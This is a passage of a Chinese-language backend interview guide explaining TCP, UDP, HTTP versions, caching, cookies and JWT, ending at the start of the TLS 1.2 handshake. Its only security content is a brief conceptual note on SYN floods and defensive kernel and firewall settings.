# Web 协议面试深度指南

> 覆盖 TCP/UDP/HTTP/HTTPS/WebSocket/DNS 全栈网络协议，面向后端开发面试。

---

## 目录

- [一、TCP 协议深度](#一tcp-协议深度)
- [二、UDP 协议](#二udp-协议)
- [三、HTTP 协议深度](#三http-协议深度)
- [四、HTTPS & TLS](#四https--tls)
- [五、WebSocket 协议深度](#五websocket-协议深度)
- [六、DNS & 网络基础设施](#六dns--网络基础设施)
- [七、网络安全](#七网络安全)
- [八、面试高频速查](#八面试高频速查)

---

# 一、TCP 协议深度

---

## 1.1 TCP 报文格式

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |       |C|E|U|A|P|R|S|F|                               |
| Offset| Rsrvd |W|C|R|C|S|S|Y|I|            Window             |
|       |       |R|E|G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if any)                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

| 字段 | 长度 | 说明 |
|------|------|------|
| Source Port | 16 bit | 源端口 |
| Destination Port | 16 bit | 目标端口 |
| Sequence Number | 32 bit | 序列号，标识发送的字节流位置 |
| Acknowledgment Number | 32 bit | 确认号，期望收到的下一个字节序列号 |
| Data Offset | 4 bit | 首部长度（单位 4 字节，最大 60 字节） |
| **SYN** | 1 bit | 同步标志，建立连接 |
| **ACK** | 1 bit | 确认标志，确认号有效 |
| **FIN** | 1 bit | 结束标志，释放连接 |
| **RST** | 1 bit | 重置连接（异常关闭） |
| **PSH** | 1 bit | 推送，接收方应尽快交给应用层 |
| **URG** | 1 bit | 紧急指针有效 |
| Window | 16 bit | 接收窗口大小（流量控制） |
| Checksum | 16 bit | 校验和 |

---

## 1.2 三次握手深度

```
客户端                                     服务端
  │                                          │
  │  [CLOSED]                      [LISTEN]  │
  │                                          │
  │──── SYN, seq=x ────────────────────────▶│
  │  [SYN_SENT]                              │
  │                              [SYN_RCVD]  │
  │◀──── SYN+ACK, seq=y, ack=x+1 ──────────│
  │                                          │
  │──── ACK, ack=y+1 ──────────────────────▶│
  │  [ESTABLISHED]               [ESTABLISHED]│
  │                                          │
```

### 为什么不能两次握手？

```
场景: 旧 SYN 延迟到达

客户端                         服务端
  │                              │
  │── SYN(旧的,seq=90) ──×      │  网络延迟
  │── SYN(新的,seq=100) ───────▶│
  │◀── SYN+ACK(ack=101) ────── │  正常建立
  │── ACK ─────────────────────▶│  连接正常
  │                              │
  │      (旧 SYN 终于到达)         │
  │── SYN(旧的,seq=90) ────────▶│
  │◀── SYN+ACK(ack=91) ────────│  二次握手直接建立！
  │                              │  服务端误建连接，浪费资源
```

三次握手时，客户端收到 `ack=91` 后知道这是旧连接，会发 RST 拒绝。

### 为什么不能四次握手？

三次已经足够：
- 第一次：服务端确认"客户端能发"
- 第二次：客户端确认"服务端能收能发"
- 第三次：服务端确认"客户端能收"

四次就是浪费了（第二次的 SYN+ACK 可以合并）。

### 半连接队列 & 全连接队列

```
                    三次握手过程中的两个队列

客户端 ──SYN──▶ 服务端
                 │
                 ▼
          ┌─────────────┐
          │ 半连接队列     │  ← SYN_RCVD 状态的连接
          │ (SYN Queue)  │     大小: /proc/sys/net/ipv4/tcp_max_syn_backlog
          └──────┬──────┘
                 │ 收到客户端 ACK
                 ▼
          ┌─────────────┐
          │ 全连接队列     │  ← ESTABLISHED 状态，等待 accept()
          │ (Accept Queue)│    大小: min(backlog, somaxconn)
          └──────┬──────┘
                 │ 应用调用 accept()
                 ▼
            返回 connfd
```

### SYN Flood 攻击 & 防御

```
攻击原理:
  攻击者发送大量 SYN（伪造源 IP）→ 半连接队列被填满 → 正常连接无法建立

防御方案:

1. SYN Cookie（最有效）
   - 服务端不保存半连接状态
   - 用加密算法把连接信息编码到 SYN+ACK 的 seq 中
   - 收到 ACK 时从 seq 恢复信息，验证合法性
   echo 1 > /proc/sys/net/ipv4/tcp_syncookies

2. 增大半连接队列
   echo 8192 > /proc/sys/net/ipv4/tcp_max_syn_backlog

3. 减少 SYN+ACK 重传次数
   echo 1 > /proc/sys/net/ipv4/tcp_synack_retries

4. 防火墙限速
   iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
```

---

## 1.3 四次挥手深度

```
主动关闭方                                 被动关闭方
  │                                          │
  │  [ESTABLISHED]               [ESTABLISHED]│
  │                                          │
  │──── FIN, seq=u ────────────────────────▶│
  │  [FIN_WAIT_1]                            │
  │                              [CLOSE_WAIT]│
  │◀──── ACK, ack=u+1 ─────────────────────│
  │  [FIN_WAIT_2]                            │
  │                                          │
  │       （被动方可能还有数据要发送）           │
  │◀──── data ──────────────────────────────│
  │                                          │
  │◀──── FIN, seq=v ───────────────────────│
  │  [TIME_WAIT]                 [LAST_ACK]  │
  │──── ACK, ack=v+1 ─────────────────────▶│
  │                              [CLOSED]    │
  │  等待 2MSL (60s) ...                      │
  │  [CLOSED]                                │
```

### TIME_WAIT

**为什么需要 2MSL？**

1. **确保最后的 ACK 到达**：如果丢失，被动方会重发 FIN，主动方还在 TIME_WAIT 能重发 ACK
2. **让旧连接的数据包在网络中消失**：防止新连接收到旧连接的延迟数据包

**TIME_WAIT 过多的问题**：

```bash
# 查看 TIME_WAIT 数量
ss -s | grep TIME-WAIT
netstat -an | grep TIME_WAIT | wc -l

# 优化方案
echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse      # 允许重用 TIME_WAIT 连接（客户端）
echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout   # 缩短 FIN_WAIT_2 超时（不是 TIME_WAIT！）

# 程序层面
setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));  # 服务端必备
```

### CLOSE_WAIT 过多排查

CLOSE_WAIT = 对端已关闭，本端还没 close()。

```bash
# 定位问题进程
ss -tnp | grep CLOSE-WAIT

# 原因: 程序 bug，收到对端 FIN 后没有调用 close()
# 排查: 检查是否正确关闭连接，是否有泄漏的 fd
```

### RST 包的场景

```
1. 连接不存在:
   客户端连接一个没有监听的端口 → 服务端回 RST

2. 异常关闭:
   程序崩溃或 kill -9 → 内核发 RST（不走四次挥手）

3. 半开连接:
   一端崩溃重启后收到旧连接的数据 → 回 RST

4. SO_LINGER 设置:
   l_onoff=1, l_linger=0 → close() 时直接发 RST

5. 接收缓冲区有未读数据时 close():
   内核直接发 RST 而不是 FIN
```

---

## 1.4 可靠传输

### 序列号与确认号

```
发送方                                    接收方
  │                                        │
  │── [seq=1000, len=100] ───────────────▶│
  │◀── [ack=1100] ─────────────────────── │  "我期望下一个字节是 1100"
  │── [seq=1100, len=200] ───────────────▶│
  │◀── [ack=1300] ─────────────────────── │  "我期望下一个字节是 1300"
```

### 超时重传

```
发送方                                    接收方
  │                                        │
  │── [seq=1000] ────── ✗ (丢包) ──────── │
  │                                        │
  │  等待 RTO (Retransmission Timeout)...  │
  │                                        │
  │── [seq=1000] (重传) ─────────────────▶│
  │◀── [ack=1100] ─────────────────────── │

RTO 计算:
- 初始 RTO ≈ 1 秒
- 根据 RTT 动态调整: RTO = SRTT + 4 × RTTVAR
- 每次超时 RTO 翻倍（指数退避）
- 最大重传次数: tcp_retries2 (默认 15，约 13-30 分钟)
```

### 快速重传

```
发送方                                    接收方
  │                                        │
  │── [seq=1] ───────────────────────────▶│  收到
  │── [seq=2] ───── ✗ (丢包) ──────────── │
  │── [seq=3] ───────────────────────────▶│  收到，但 2 没到
  │◀── [ack=2] (重复) ────────────────── │  "我还在等 2"
  │── [seq=4] ───────────────────────────▶│  收到，但 2 没到
  │◀── [ack=2] (重复) ────────────────── │  "我还在等 2"
  │── [seq=5] ───────────────────────────▶│  收到，但 2 没到
  │◀── [ack=2] (重复) ────────────────── │  "我还在等 2"
  │                                        │
  │  收到 3 个重复 ACK → 立即重传 seq=2！    │
  │── [seq=2] (快速重传) ───────────────▶│
  │◀── [ack=6] ─────────────────────────│  一次性确认 2-5
```

### SACK（选择性确认）

```
// 告诉发送方"我收到了哪些"，只重传丢失的
接收方回复: ACK=2, SACK=3-5
// 意思: 2 丢了，但 3,4,5 都收到了
// 发送方只需重传 2，不需要重传 3,4,5
```

---

## 1.5 流量控制 — 滑动窗口

**目的**：接收方告诉发送方"我还能接收多少数据"，防止接收方被淹没。

```
发送窗口:
┌──────────────────────────────────────────────────────┐
│  已确认   │  已发送未确认  │  可以发送  │    不能发送    │
│ (已完成)  │  (在途中)      │ (窗口内)   │  (窗口外)     │
└──────────────────────────────────────────────────────┘
           ↑               ↑            ↑
        SND.UNA         SND.NXT     SND.UNA + SND.WND

接收窗口:
┌──────────────────────────────────────────────────────┐
│  已确认交付  │  允许接收      │    不允许接收              │
│ (已读取)     │ (接收窗口)     │                          │
└──────────────────────────────────────────────────────┘
              ↑               ↑
           RCV.NXT      RCV.NXT + RCV.WND
```

```
工作过程:
1. 接收方在 ACK 中携带 Window 字段 (如 Window=4096)
2. 发送方据此控制发送速率
3. 接收方处理数据后，Window 增大 → 发送方可以发更多

零窗口:
  接收方 Window=0 → 发送方停止发送
  发送方定期发送零窗口探测包 (ZWP)
  接收方窗口恢复后回复非零 Window
```

### 窗口缩放因子（Window Scale）

```
Window 字段只有 16 位 → 最大 65535 字节
高速网络下不够用

TCP Option: Window Scale
  在三次握手时协商缩放因子 S
  实际窗口 = Window << S
  S 最大 14 → 最大窗口 65535 << 14 = 1GB
```

---

## 1.6 拥塞控制

**目的**：防止发送方发太快导致网络拥塞（和流量控制不同——流量控制针对接收方，拥塞控制针对网络）。

### 四个算法

```
       cwnd (拥塞窗口大小)
         │
         │          ┌──────── 拥塞避免 ─────────┐
         │         /                             │
         │        /                              │ 检测到丢包
         │       /                               │
         │      /                                ▼
         │     / 慢启动                      快速恢复
         │    /  (指数增长)                   cwnd 减半
         │   /                               │
         │  /                                │
         │ /                                 ▼
         │/                              拥塞避免
     ────┼─────────────────────────────────── 时间
         │
     ssthresh (慢启动阈值)
```

### 1. 慢启动（Slow Start）

```
初始: cwnd = 1 MSS (Maximum Segment Size, 通常 1460 bytes)

每收到一个 ACK: cwnd += 1 MSS
→ 每个 RTT: cwnd 翻倍（指数增长）

RTT 1: cwnd = 1   → 发 1 个包
RTT 2: cwnd = 2   → 发 2 个包
RTT 3: cwnd = 4   → 发 4 个包
RTT 4: cwnd = 8   → 发 8 个包
...

当 cwnd >= ssthresh → 进入拥塞避免
```

### 2. 拥塞避免（Congestion Avoidance）

```
每个 RTT: cwnd += 1 MSS（线性增长）

cwnd = 16 → 17 → 18 → 19 → ...（慢慢涨）

检测到拥塞（丢包）时:
- 超时: ssthresh = cwnd/2, cwnd = 1, 回到慢启动
- 3个重复ACK: ssthresh = cwnd/2, cwnd = ssthresh + 3, 进入快速恢复
```

### 3. 快速重传 + 快速恢复（Fast Retransmit + Fast Recovery）

```
收到 3 个重复 ACK:
1. ssthresh = cwnd / 2
2. cwnd = ssthresh + 3（+3 是因为收到了 3 个重复 ACK，说明有 3 个包到了）
3. 重传丢失的包
4. 每收到一个重复 ACK: cwnd += 1
5. 收到新的 ACK: cwnd = ssthresh，进入拥塞避免

对比超时重传:
  超时: cwnd 直接降到 1（惩罚很重）
  快速恢复: cwnd 降到一半（惩罚较轻）
  因为: 能收到重复 ACK 说明网络还通，不至于太差
```

### BBR 拥塞控制（Google, 2016）

```
传统算法: 基于丢包判断拥塞（丢包了才反应）
BBR: 基于带宽和延迟模型（主动探测）

BBR 核心思想:
  最大带宽 BtlBw = max(delivery_rate)
  最小延迟 RTprop = min(RTT)
  最佳发送速率 = BtlBw × RTprop

四个阶段:
1. Startup: 指数增长探测带宽
2. Drain: 排空队列中的多余数据
3. ProbeBW: 周期性探测带宽变化
4. ProbeRTT: 降低发送速率测量最小 RTT

优势:
- 不依赖丢包信号
- 在有随机丢包的网络（如无线）表现更好
- 更充分利用带宽

启用: sysctl net.ipv4.tcp_congestion_control=bbr
```

---

## 1.7 Nagle 算法 & 延迟 ACK

### Nagle 算法

```
目的: 减少小包数量，提高网络效率

规则:
  如果有已发送但未确认的数据 → 缓冲新的小数据
  直到:
  1. 收到 ACK（前面的数据被确认），或
  2. 缓冲区积累到 MSS 大小

效果:
  用户输入 "hello" (每次发一个字符):
  不开 Nagle: h → e → l → l → o (5 个包)
  开 Nagle:   h → ello (2 个包，h 被确认后才发 ello)
```

### 延迟 ACK

```
目的: 减少纯 ACK 包数量

规则:
  收到数据后不立即回 ACK，等最多 200ms
  期间如果有数据要发，就把 ACK 搭便车

问题: Nagle + 延迟 ACK = 组合延迟
  发送方: 等 ACK 才发下一批 (Nagle)
  接收方: 等 200ms 才发 ACK (延迟 ACK)
  → 每次交互多 200ms 延迟！

解决:
  关闭 Nagle: setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, ...)
  适用场景: 低延迟要求（RPC、实时通信、交互式应用）
```

---

## 1.8 TCP Keep-Alive

```
目的: 检测死连接（对端崩溃、网络断开）

工作方式:
  空闲一段时间后（默认 2 小时），发送探测包
  如果对端回复 → 连接正常，重置计时器
  如果对端不回复 → 重试几次后认为连接已断

内核参数:
  tcp_keepalive_time  = 7200  # 空闲多久开始探测（秒）
  tcp_keepalive_intvl = 75    # 探测间隔（秒）
  tcp_keepalive_probes = 9    # 最大探测次数

应用层心跳 vs TCP Keep-Alive:
  TCP Keep-Alive: 内核级，配置粗糙，2 小时太长
  应用层心跳: 灵活配置（如 10 秒），可以检测应用层假死
  建议: 两者结合，TCP Keep-Alive 兜底，应用层心跳主力
```

---

## 1.9 粘包与拆包

```
TCP 是字节流协议，没有消息边界。

发送方发了 3 条消息: [A][B][C]

接收方可能收到:
  [A][B][C]       正常
  [ABC]           全粘
  [A][BC]         部分粘
  [AB][C]         部分粘
  [A][B的一半]     拆包

解决方案:
1. 固定长度: 每条消息 N 字节
   简单但浪费空间

2. 分隔符: \r\n 或特殊标记
   HTTP 头部用 \r\n\r\n
   需要转义

3. 长度前缀（最常用）:
   [4B 长度][消息体]
   先读 4 字节得到长度 L，再读 L 字节

4. 自描述协议:
   Protobuf varint 编码
   JSON 自带结构
```

---

# 二、UDP 协议

---

## 2.1 UDP 报文格式

```
 0      7 8     15 16    23 24    31
+--------+--------+--------+--------+
|     Source       |   Destination   |
|      Port        |      Port       |
+--------+--------+--------+--------+
|     Length        |    Checksum     |
+--------+--------+--------+--------+
|            Data (payload)          |
+------------------------------------+
```

头部只有 **8 字节**（TCP 头部 20-60 字节）。

---

## 2.2 TCP vs UDP

| 特性 | TCP | UDP |
|------|-----|-----|
| 连接 | 面向连接（三次握手） | 无连接 |
| 可靠性 | 可靠传输（确认、重传） | 不可靠（尽力而为） |
| 有序 | 保证顺序 | 不保证顺序 |
| 流量控制 | 滑动窗口 | 无 |
| 拥塞控制 | 有 | 无 |
| 头部开销 | 20-60 字节 | 8 字节 |
| 传输方式 | 字节流 | 数据报（有消息边界） |
| 一对多 | 一对一 | 支持广播/多播 |
| 适用场景 | 可靠传输（HTTP、文件） | 低延迟（游戏、音视频、DNS） |

**面试追问：UDP 怎么实现可靠传输？**

### KCP 协议

```
KCP: 应用层可靠 UDP
  - 基于 UDP，在应用层实现 ARQ（自动重传请求）
  - 比 TCP 更激进的重传策略（RTO 不翻倍）
  - 选择性重传，不是全量重传
  - 非退让流控（不像 TCP 那样严格的拥塞控制）
  - 典型延迟比 TCP 低 30%-40%
  - 代价：浪费 10%-20% 带宽

适用场景: 游戏、实时音视频、远程桌面
```

### QUIC 协议

```
QUIC (HTTP/3 的底层): Google 设计，基于 UDP
  - 0-RTT 建连（第二次连接时）
  - 多路复用（无队头阻塞）
  - 连接迁移（切换 WiFi/4G 不断连）
  - 内置 TLS 1.3
  - 前向纠错 (FEC)
```

---

## 2.3 UDP 应用场景

| 协议/应用 | 为什么用 UDP |
|-----------|------------|
| DNS | 查询小且快，53 端口 |
| DHCP | 客户端还没有 IP，无法建立 TCP |
| 游戏 | 低延迟比可靠性重要（丢一帧没关系） |
| 音视频通话 | 实时性优先，丢包可以容忍 |
| QUIC/HTTP3 | 避免 TCP 队头阻塞 |
| NTP | 时间同步不需要可靠 |
| SNMP | 简单网管，开销小 |

---

# 三、HTTP 协议深度

---

## 3.1 HTTP 请求报文

```
GET /api/users?page=1 HTTP/1.1\r\n      ← 请求行
Host: www.example.com\r\n                ← 请求头
User-Agent: Mozilla/5.0\r\n
Accept: application/json\r\n
Connection: keep-alive\r\n
Cookie: session=abc123\r\n
\r\n                                      ← 空行（头部结束）
                                          ← 请求体（GET 通常为空）
```

## 3.2 HTTP 响应报文

```
HTTP/1.1 200 OK\r\n                      ← 状态行
Content-Type: application/json\r\n        ← 响应头
Content-Length: 48\r\n
Set-Cookie: session=xyz789; HttpOnly\r\n
Cache-Control: max-age=3600\r\n
\r\n                                      ← 空行
{"users": [{"id": 1, "name": "Alice"}]}  ← 响应体
```

---

## 3.3 HTTP 请求方法

| 方法 | 语义 | 幂等 | 安全 | 有请求体 | 常见用途 |
|------|------|------|------|---------|---------|
| GET | 获取资源 | 是 | 是 | 否 | 查询数据 |
| POST | 提交数据 | 否 | 否 | 是 | 创建资源 |
| PUT | 替换资源 | 是 | 否 | 是 | 全量更新 |
| PATCH | 部分更新 | 否 | 否 | 是 | 局部更新 |
| DELETE | 删除资源 | 是 | 否 | 否 | 删除资源 |
| HEAD | 获取头部 | 是 | 是 | 否 | 检查资源是否存在 |
| OPTIONS | 查询支持的方法 | 是 | 是 | 否 | CORS 预检 |

**幂等**：多次执行结果相同。`POST` 不幂等（每次创建新资源）。
**安全**：不改变服务器状态。只有 `GET`、`HEAD`、`OPTIONS` 是安全的。

### GET vs POST

| | GET | POST |
|--|-----|------|
| 参数位置 | URL 查询字符串 | 请求体 |
| 长度限制 | URL 有长度限制（浏览器约 2KB-8KB） | 无限制 |
| 缓存 | 可以缓存 | 默认不缓存 |
| 书签 | 可以收藏 | 不可以 |
| 历史记录 | 参数保存在历史记录 | 不保存 |
| 安全性 | 参数暴露在 URL | 相对安全（但不是加密） |
| 幂等性 | 幂等 | 非幂等 |
| 编码 | application/x-www-form-urlencoded | 多种（form、json、multipart） |

---

## 3.4 HTTP 状态码

### 1xx 信息

| 状态码 | 含义 |
|--------|------|
| 100 Continue | 继续发送请求体 |
| 101 Switching Protocols | 协议升级（WebSocket 握手） |

### 2xx 成功

| 状态码 | 含义 |
|--------|------|
| **200 OK** | 请求成功 |
| **201 Created** | 资源创建成功（POST 响应） |
| 204 No Content | 成功但无响应体（DELETE 响应） |
| 206 Partial Content | 断点续传 |

### 3xx 重定向

| 状态码 | 含义 | 区别 |
|--------|------|------|
| **301 Moved Permanently** | 永久重定向 | 浏览器会缓存 |
| **302 Found** | 临时重定向 | 每次都请求原 URL |
| 304 Not Modified | 协商缓存命中 | 不返回响应体 |
| 307 Temporary Redirect | 临时重定向（保持方法） | POST 不会变 GET |
| 308 Permanent Redirect | 永久重定向（保持方法） | POST 不会变 GET |

### 4xx 客户端错误

| 状态码 | 含义 |
|--------|------|
| **400 Bad Request** | 请求格式错误 |
| **401 Unauthorized** | 未认证（需要登录） |
| **403 Forbidden** | 已认证但无权限 |
| **404 Not Found** | 资源不存在 |
| 405 Method Not Allowed | 方法不支持 |
| 408 Request Timeout | 请求超时 |
| 413 Payload Too Large | 请求体太大 |
| 429 Too Many Requests | 限流 |

### 5xx 服务端错误

| 状态码 | 含义 |
|--------|------|
| **500 Internal Server Error** | 服务端异常 |
| 502 Bad Gateway | 网关/代理收到无效响应 |
| **503 Service Unavailable** | 服务不可用（过载/维护） |
| 504 Gateway Timeout | 网关超时 |

---

## 3.5 重要头部字段

### 通用头

| 头部 | 说明 | 示例 |
|------|------|------|
| Connection | 连接管理 | `keep-alive` / `close` |
| Cache-Control | 缓存控制 | `max-age=3600` / `no-cache` |
| Date | 消息创建时间 | `Thu, 09 Apr 2026 10:00:00 GMT` |

### 请求头

| 头部 | 说明 | 示例 |
|------|------|------|
| Host | 目标主机（必需） | `www.example.com` |
| User-Agent | 客户端标识 | `Mozilla/5.0 ...` |
| Accept | 可接受的媒体类型 | `application/json` |
| Accept-Encoding | 可接受的编码 | `gzip, deflate, br` |
| Authorization | 认证信息 | `Bearer <token>` |
| Cookie | 客户端 Cookie | `session=abc123` |
| If-None-Match | 协商缓存 ETag | `"abc123"` |
| If-Modified-Since | 协商缓存时间 | `Thu, 01 Jan 2026 00:00:00 GMT` |
| Content-Type | 请求体类型 | `application/json` |
| Origin | 来源（CORS） | `https://example.com` |

### 响应头

| 头部 | 说明 | 示例 |
|------|------|------|
| Content-Type | 响应体类型 | `text/html; charset=utf-8` |
| Content-Length | 响应体长度 | `1024` |
| Content-Encoding | 编码方式 | `gzip` |
| Set-Cookie | 设置 Cookie | `session=xyz; HttpOnly; Secure` |
| ETag | 资源标识 | `"abc123"` |
| Last-Modified | 最后修改时间 | `Thu, 01 Jan 2026 00:00:00 GMT` |
| Access-Control-Allow-Origin | CORS 允许的源 | `*` 或具体域名 |
| Location | 重定向目标 | `https://new.example.com/` |

---

## 3.6 Cookie & Session & Token

### Cookie

```
设置 Cookie:
服务端 → Set-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600

客户端后续请求自动携带:
Cookie: session_id=abc123

属性:
  HttpOnly: JS 无法读取（防 XSS 窃取）
  Secure: 仅 HTTPS 传输
  SameSite: 防 CSRF
    - Strict: 跨站请求不携带 Cookie
    - Lax: 导航类跨站可以（链接、GET 表单）
    - None: 都携带（需要 Secure）
  Max-Age / Expires: 过期时间
  Domain / Path: 作用范围
```

### Session

```
工作流程:
1. 客户端首次请求 → 服务端生成 Session，存储在服务端（内存/Redis）
2. 服务端返回 Session ID（通过 Cookie）
3. 客户端后续请求携带 Session ID
4. 服务端根据 Session ID 查找对应的 Session 数据

存储方式:
  内存: 简单但不能分布式
  Redis: 分布式 Session，常见方案
  数据库: 可以但性能差
```

### Token (JWT)

```
JWT 结构:
  header.payload.signature
  xxxxx.yyyyy.zzzzz

Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "user123", "name": "Alice", "exp": 1716000000}
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)

优势 vs Session:
  - 无状态: 服务端不需要存储，适合分布式
  - 自包含: Token 本身包含用户信息
  - 跨域友好: 放在 Authorization 头中

劣势:
  - 无法主动失效（除非用黑名单）
  - Payload 不加密（只是 Base64 编码）
  - Token 较大（比 Session ID 大）
```

---

## 3.7 HTTP 缓存机制

```
浏览器请求资源时的缓存决策:

1. 检查强缓存:
   Cache-Control: max-age=3600 → 3600 秒内直接用缓存（不请求服务器）
   Expires: Thu, 09 Apr 2026 11:00:00 GMT → 绝对过期时间

   Cache-Control 优先级 > Expires

2. 强缓存过期 → 协商缓存:
   浏览器发请求，带上缓存标识:
   If-None-Match: "abc123"           (对应 ETag)
   If-Modified-Since: Thu, 01 Jan... (对应 Last-Modified)

   服务端检查资源是否变化:
   未变化 → 304 Not Modified（不返回资源体，用缓存）
   已变化 → 200 OK + 新资源

   ETag 优先级 > Last-Modified
```

```
                      请求资源
                         │
                    有本地缓存？
                    │         │
                   否          是
                    │         │
               正常请求   强缓存有效？
               200 OK    (max-age/Expires)
                         │         │
                        是          否
                         │         │
                    直接用缓存   协商缓存
                    (不请求)    (If-None-Match/
                               If-Modified-Since)
                                  │
                            资源变了？
                            │       │
                           否        是
                            │       │
                        304        200
                        用缓存     新资源
```

### Cache-Control 详解

| 值 | 说明 |
|----|------|
| `max-age=N` | N 秒内有效（强缓存） |
| `no-cache` | 每次必须协商缓存（不是不缓存！） |
| `no-store` | 真正不缓存，每次都请求 |
| `private` | 只能浏览器缓存，不能 CDN 缓存 |
| `public` | 可以被任何中间节点缓存 |
| `must-revalidate` | 过期后必须重新验证 |
| `s-maxage=N` | CDN 缓存时间（覆盖 max-age） |

---

## 3.8 HTTP Keep-Alive & Pipeline

### Keep-Alive

```
HTTP/1.0: 默认短连接，每个请求一个 TCP 连接
  请求1: TCP 建连 → 请求 → 响应 → TCP 断开
  请求2: TCP 建连 → 请求 → 响应 → TCP 断开

HTTP/1.1: 默认长连接 (Connection: keep-alive)
  TCP 建连 → 请求1 → 响应1 → 请求2 → 响应2 → ... → TCP 断开

优势: 避免重复三次握手和慢启动
头部: Connection: keep-alive / close
      Keep-Alive: timeout=60, max=100
```

### Pipeline（流水线）

```
没有 Pipeline:
  客户端: 请求1 ──────▶ 等响应1 ──▶ 请求2 ──────▶ 等响应2

有 Pipeline:
  客户端: 请求1 ──▶ 请求2 ──▶ 请求3 ──▶
  服务端: ◀── 响应1 ◀── 响应2 ◀── 响应3

问题: 队头阻塞 (Head-of-Line Blocking)
  响应必须按请求顺序返回
  如果响应1 很慢，响应2、3 即使准备好了也要等

HTTP/2 的多路复用彻底解决了这个问题
```

---

## 3.9 HTTP 版本演进

### HTTP/1.0 → HTTP/1.1

| 特性 | HTTP/1.0 | HTTP/1.1 |
|------|---------|---------|
| 连接 | 短连接（每次新建） | 长连接（Keep-Alive 默认开启） |
| Host | 不需要 | 必需（支持虚拟主机） |
| Pipeline | 无 | 支持（但有队头阻塞） |
| 缓存 | Expires | + Cache-Control、ETag |
| 断点续传 | 无 | Range 头 |
| 方法 | GET、POST、HEAD | + PUT、DELETE、OPTIONS、PATCH... |

### HTTP/2

```
核心改进:

1. 二进制帧 (Binary Framing)
   HTTP/1.1: 文本协议 "GET / HTTP/1.1\r\n..."
   HTTP/2: 二进制帧 [Length][Type][Flags][Stream ID][Payload]

2. 多路复用 (Multiplexing) — 最大改进
   一个 TCP 连接上并行多个请求/响应
   每个请求有唯一的 Stream ID
   不再有队头阻塞（HTTP 层面）

   HTTP/1.1: ──请求1──响应1──请求2──响应2──
   HTTP/2:   ──请求1──请求2──响应2──响应1──  (可以乱序)

3. 头部压缩 (HPACK)
   HTTP/1.1: 每次请求都带完整头部（几百字节）
   HTTP/2: 头部字段用索引表压缩，相同的头不重复发送
   压缩率: 85%~95%

4. Server Push
   服务端可以主动推送资源
   客户端请求 HTML → 服务端主动推送 CSS、JS
   减少一次往返

5. 流优先级 (Stream Priority)
   可以给不同请求设置优先级
   CSS/JS 优先于图片

局限:
  仍基于 TCP → TCP 层面的队头阻塞仍然存在
  一个包丢失 → 整个 TCP 连接的所有 Stream 都被阻塞
```

### HTTP/3 & QUIC

```
HTTP/3 = HTTP over QUIC (基于 UDP)

解决的问题:
1. TCP 队头阻塞: QUIC 每个 Stream 独立，一个丢包不影响其他 Stream
2. 连接建立慢: QUIC 0-RTT 恢复（首次 1-RTT，后续 0-RTT）
3. 网络切换断连: QUIC 用 Connection ID 标识连接，换 IP 不断连

对比:
┌─────────────┬──────────────┬──────────────┐
│   HTTP/1.1  │   HTTP/2     │   HTTP/3     │
├─────────────┼──────────────┼──────────────┤
│ TCP + TLS   │ TCP + TLS    │ QUIC (UDP)   │
│ 文本协议     │ 二进制帧      │ 二进制帧      │
│ 队头阻塞     │ TCP级队头阻塞  │ 无队头阻塞    │
│ 3-RTT 建连   │ 3-RTT 建连   │ 0/1-RTT 建连 │
│ 无多路复用    │ 多路复用      │ 多路复用      │
│ 无压缩       │ HPACK 压缩    │ QPACK 压缩   │
└─────────────┴──────────────┴──────────────┘
```

---

## 3.10 RESTful API 设计

```
资源导向:
  GET    /users          获取用户列表
  POST   /users          创建用户
  GET    /users/123      获取特定用户
  PUT    /users/123      更新用户（全量）
  PATCH  /users/123      更新用户（部分）
  DELETE /users/123      删除用户

嵌套资源:
  GET    /users/123/posts          用户 123 的帖子
  POST   /users/123/posts          创建帖子
  GET    /users/123/posts/456      获取特定帖子

查询参数:
  GET /users?page=1&limit=20&sort=name&order=asc
  GET /users?name=Alice&age_gte=18

状态码约定:
  创建成功: 201 Created + Location 头
  无响应体: 204 No Content
  参数错误: 400 Bad Request
  未认证: 401 Unauthorized
  无权限: 403 Forbidden
  不存在: 404 Not Found
  限流: 429 Too Many Requests

版本控制:
  URL: /api/v1/users
  Header: Accept: application/vnd.myapi.v1+json
```

---

# 四、HTTPS & TLS

---

## 4.1 对称加密 vs 非对称加密

| | 对称加密 | 非对称加密 |
|--|---------|-----------|
| 密钥 | 加解密同一个密钥 | 公钥加密，私钥解密 |
| 速度 | 快（100-1000x） | 慢 |
| 常见算法 | AES-128/256, ChaCha20 | RSA-2048, ECDSA, Ed25519 |
| 问题 | 密钥如何安全传输？ | 太慢，不适合加密大量数据 |

**HTTPS 方案**：非对称加密交换密钥 → 对称加密传输数据

---

## 4.2 TLS 1.2 握手

```
客户端                                      服务端
  │                                            │
  │── ClientHello ────────────────────────────▶│
